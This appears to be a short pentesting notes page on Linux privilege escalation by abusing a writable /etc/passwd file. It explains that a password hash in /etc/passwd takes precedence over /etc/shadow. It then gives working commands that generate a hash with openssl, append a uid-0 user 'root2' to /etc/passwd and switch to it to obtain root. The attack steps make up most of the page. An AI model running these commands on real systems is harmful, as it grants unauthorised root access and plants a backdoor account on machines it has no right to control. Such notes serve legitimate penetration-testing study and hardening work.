# Password Authentication Abuse

Unless a centralised credential system is set up such as AD or LDAP, linux passwords are stored in `/etc/shadow`

For backwards compatibility, if a password hash is present in the second column of an `/etc/passwd` user record, it is considered valid for authentication and it takes precedence over the respective entry in `/etc/shadow`. So we can abuse a writable `etc/passwd` file.



<figure><img src="../../../.gitbook/assets/Linux Privilege Escalation-3.png" alt=""><figcaption></figcaption></figure>

Generate a password hash using:

```
openssl passwd w00t
```

```
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
```

```
su root2
Password:w00t
```

Now we are root.

Note the 0s for uid and gid.
